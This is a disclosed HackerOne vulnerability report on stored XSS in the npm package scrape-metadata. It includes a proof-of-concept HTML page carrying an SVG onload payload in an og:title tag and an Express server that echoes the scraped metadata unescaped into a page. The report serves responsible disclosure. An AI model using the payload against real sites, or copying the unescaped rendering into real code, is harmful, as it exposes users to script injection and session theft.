# stored xss in scrape-metadata when reading metadata from an html page

## Report Details
- **Report ID**: 369573
- **URL**: https://hackerone.com/reports/369573
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-06-21T15:16:13.694Z
- **Disclosed**: 2018-07-27T11:25:18.117Z

## Reporter
- **Username**: johnssimon007
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hy

# Module
scrape-metadata
https://www.npmjs.com/package/scrape-metadata

## Module Description
a module used to scrape meta data contents from an article

## Vulnerability Description
It was possible to embed malicious js code in metadata content read by scrape-metadata. When library reads such metadata, there was no sanitization performed. If output from scrape-metadata is rendered directly in HTML code,it can lead to xss/html injection.

## Steps To Reproduce:
create a website, I used a local server available at http://127.0.0.1:8080
Below is html file with js code injected in 'og:title property' and i uploaded the file to my
remote server http://pokegen.in/test.html

<!doctype html>
<html xmlns:og="http://ogp.me/ns#" lang="en">

<head>
    <meta charset="utf8">
    <title>scrap-meta</title>

    <meta property="og:description" content="hackerone">
    <meta property="og:image" content="image">
    <meta property="og:title" content='https://google.com<svg/onload=prompt(1)>'>
    <meta property="og:type" content="article">
</head>
<body>
</body>
</html>

install scrape-metadata
npm install scrape-metadata

const http=require('http');
const server=http.createServer();
const express=require('express');
const app=express();
const scrape = require('scrape-metadata')
var url = "http://pokegen.in/test.html";
app.get('/scrap', function(req, res) {
scrape(url, (err, meta) => {
    console.log(meta)
      let __html = `
               <div>
                   <p>site title:${JSON.stringify(meta)}</p>
               </div>
           `
           res.send(__html)
  });

});

app.listen(8080)

save this as scrap.js
now run the app,node scrap.js
now goto http://127.0.0.1:8080/scrap on browser.and you will get a javascript prompt

Supporting Material/References:

Configuration I've used to find this vulnerability:
windows 7
node 8.9.3
npm 5.5.1
curl 7.54.0
# Wrap up
 If you have any questions about any details of this finding, please let me know in comment.

Thank you

Regards,
johns simon


- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

This might lead to stealing session cookies from infected website, and much more sophisticated attacks

## Attachments
No attachments
